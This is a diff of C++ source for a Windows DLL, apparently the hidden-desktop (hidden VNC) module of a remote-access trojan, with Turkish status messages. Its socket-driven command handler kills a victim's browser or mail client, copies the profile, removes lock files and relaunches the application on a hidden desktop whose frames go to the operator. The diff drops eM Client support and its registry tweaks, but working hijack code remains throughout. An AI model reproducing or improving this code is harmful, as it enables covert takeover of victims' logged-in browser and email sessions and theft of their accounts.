@@ -690,23 +690,6 @@ static bool compress_buffer(const std::vector<unsigned char>& input, std::vector
     return false;
 }
 
-static void clean_sqlite_locks(const fs::path& dir) {
-    if (!fs::exists(dir)) return;
-    try {
-        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
-            if (entry.is_regular_file()) {
-                wstring name = entry.path().filename().wstring();
-                if (name.size() >= 4) {
-                    wstring suffix4 = name.substr(name.size() - 4);
-                    if (_wcsicmp(suffix4.c_str(), L"-shm") == 0 || _wcsicmp(suffix4.c_str(), L"-wal") == 0) {
-                        fs::remove(entry.path());
-                    }
-                }
-            }
-        }
-    } catch (...) {}
-}
-
 static void kill_process_by_name(const wstring& exeName) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
@@ -1922,10 +1905,7 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (browserName == L"eM Client") {
-        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
-        return wstring(szPath) + L"\\eM Client";
-    } else if (browserName == L"Opera" || browserName == L"Opera GX") {
+    if (browserName == L"Opera" || browserName == L"Opera GX") {
         if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
@@ -2001,37 +1981,6 @@ static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<
             }
         }
     } catch (...) {}
-}
-
-static bool write_registry_dword(HKEY hKeyParent, const wstring& subkey, const wstring& valueName, DWORD value) {
-    HKEY hKey = NULL;
-    if (RegCreateKeyExW(hKeyParent, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        LONG res = RegSetValueExW(hKey, valueName.c_str(), 0, REG_DWORD, (const BYTE*)&value, sizeof(DWORD));
-        RegCloseKey(hKey);
-        return res == ERROR_SUCCESS;
-    }
-    return false;
-}
-
-static bool read_registry_dword(HKEY hKeyParent, const wstring& subkey, const wstring& valueName, DWORD& outValue) {
-    HKEY hKey = NULL;
-    if (RegOpenKeyExW(hKeyParent, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        DWORD size = sizeof(DWORD);
-        LONG res = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, (LPBYTE)&outValue, &size);
-        RegCloseKey(hKey);
-        return res == ERROR_SUCCESS;
-    }
-    return false;
-}
-
-static bool delete_registry_value(HKEY hKeyParent, const wstring& subkey, const wstring& valueName) {
-    HKEY hKey = NULL;
-    if (RegOpenKeyExW(hKeyParent, subkey.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        LONG res = RegDeleteValueW(hKey, valueName.c_str());
-        RegCloseKey(hKey);
-        return res == ERROR_SUCCESS;
-    }
-    return false;
 }
 
 static bool CopyFileWithSharing(const wchar_t* src, const wchar_t* dst) {
@@ -2207,8 +2156,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird" ||
-                              wRequestedPath == L"eM Client");
+                              wRequestedPath == L"Thunderbird");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2230,7 +2178,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
-                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2239,10 +2186,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     wstring exePath;
-                    if (wRequestedPath == L"eM Client") {
-                        exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
-                        if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
-                    } else if (wRequestedPath == L"Opera") {
+                    if (wRequestedPath == L"Opera") {
                         wchar_t localApp[MAX_PATH] = {0};
                         SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                         exePath = wstring(localApp) + L"\\Programs\\Opera\\launcher.exe";
@@ -2389,19 +2333,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (wRequestedPath == L"eM Client" && !profilePath.empty()) {
-                        clean_sqlite_locks(profilePath);
-                    }
-
                     send_status("Tarayıcı başlatılıyor...");
 
                     wstring args;
-                    if (wRequestedPath == L"eM Client") {
-                        args = L" /localmutex";
-                        if (copyProfile && !profilePath.empty()) {
-                            args += L" /dblocation \"" + profilePath + L"\"";
-                        }
-                    } else if (isGecko) {
+                    if (isGecko) {
                         args = L" -no-remote -allow-downgrade";
                         if (wRequestedPath == L"Thunderbird") {
                             args += L" -mail";
@@ -2495,7 +2430,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
-                            } else if (wRequestedPath != L"eM Client") {
+                            } else {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
                                 fs::remove(fs::path(profilePath) / L"SingletonCookie");
@@ -2516,74 +2451,36 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     si.dwFlags      = STARTF_USESHOWWINDOW;
                     si.wShowWindow  = SW_SHOWNORMAL;
 
-                    // Spawn a pristine thread to guarantee SetThreadDesktop succeeds 100%
-                    // before calling CreateProcessW so that grandchild processes are correctly
-                    // created on the hidden desktop context.
-                    thread([cmdLine, si, isGecko, wRequestedPath]() {
-                        ensure_desktop();
-                        if (!g_hHiddenDesktop) return;
+                    PROCESS_INFORMATION pi = { 0 };
 
-                        HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
-                        if (g_hHiddenDesktop) {
-                            SetThreadDesktop(g_hHiddenDesktop);
-                        }
+                    HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
+                    if (g_hHiddenDesktop) {
+                        SetThreadDesktop(g_hHiddenDesktop);
+                    }
 
-                        if (isGecko) {
-                            SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
-                            SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
-                        }
+                    if (isGecko) {
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", L"1");
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
+                    }
 
-                        bool isEMClient = (wRequestedPath == L"eM Client");
-                        bool hasOldVal = false;
-                        DWORD oldVal = 0;
-                        bool hasOldValLM = false;
-                        DWORD oldValLM = 0;
-                        if (isEMClient) {
-                            hasOldVal = read_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
-                            write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
-                            hasOldValLM = read_registry_dword(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldValLM);
-                            write_registry_dword(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
-                            SetEnvironmentVariableW(L"WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS", L"--disable-gpu --disable-gpu-compositing --force-cpu-draw --no-sandbox");
-                        }
+                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                       0, NULL, NULL, &si, &pi)) {
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                        request_full_frame(true);
+                        send_status("Browser started on hidden desktop");
+                    } else {
+                        send_error("Failed to start browser. Error: " + to_string(GetLastError()));
+                    }
 
-                        PROCESS_INFORMATION pi = { 0 };
-                        vector<wchar_t> cmdLineWriteable(cmdLine.begin(), cmdLine.end());
-                        cmdLineWriteable.push_back(L'\0');
+                    if (isGecko) {
+                        SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
+                        SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
+                    }
 
-                        if (CreateProcessW(NULL, cmdLineWriteable.data(), NULL, NULL, FALSE,
-                                           0, NULL, NULL, (STARTUPINFOW*)&si, &pi)) {
-                            CloseHandle(pi.hProcess);
-                            CloseHandle(pi.hThread);
-                            request_full_frame(true);
-                            send_status("Browser started on hidden desktop");
-                        } else {
-                            send_error("Failed to start browser. Error: " + to_string(GetLastError()));
-                        }
-
-                        if (isEMClient) {
-                            Sleep(800);
-                            if (hasOldVal) {
-                                write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
-                            } else {
-                                delete_registry_value(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
-                            }
-                            if (hasOldValLM) {
-                                write_registry_dword(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldValLM);
-                            } else {
-                                delete_registry_value(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
-                            }
-                            SetEnvironmentVariableW(L"WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS", NULL);
-                        }
-
-                        if (isGecko) {
-                            SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
-                            SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
-                        }
-
-                        if (hCurrentDesktop) {
-                            SetThreadDesktop(hCurrentDesktop);
-                        }
-                    }).join();
+                    if (hCurrentDesktop) {
+                        SetThreadDesktop(hCurrentDesktop);
+                    }
                 }).detach();
             } else {
                 thread([wRequestedPath]() {
